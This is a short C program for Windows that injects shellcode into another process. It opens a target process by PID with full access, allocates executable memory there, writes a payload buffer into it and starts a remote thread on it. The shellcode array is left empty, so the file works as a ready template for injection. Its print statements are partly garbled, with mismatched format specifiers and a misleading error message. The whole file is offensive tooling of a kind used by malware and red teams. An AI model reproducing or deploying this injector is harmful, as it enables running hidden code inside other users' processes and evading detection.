#include <stdio.h>
#include <windows.h>

DWORD PID, TID  = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
unsigned char mPROF[] = "";

int main(int argc, char** argv) {

    if (argc != 2) {
        printf("%s usage: ./a.exe 1",PID);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("starting by opening process with %ld PID", PID);

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID );

    if (!hProcess) {
        printf("starting by opening process with %ld PID", GetLastError());
        return EXIT_FAILURE;
    }

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(mPROF), 
                            (MEM_COMMIT|MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hProcess, rBuffer, mPROF, sizeof(mPROF), NULL);


    hThread =  CreateRemoteThreadEx(
        hProcess,
        NULL, 
        0,
        (LPTHREAD_START_ROUTINE) rBuffer,
        NULL,
        0,
        0,
        &TID);

    if (!hThread) {
        CloseHandle(hProcess);
        return  EXIT_FAILURE;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return EXIT_SUCCESS;
}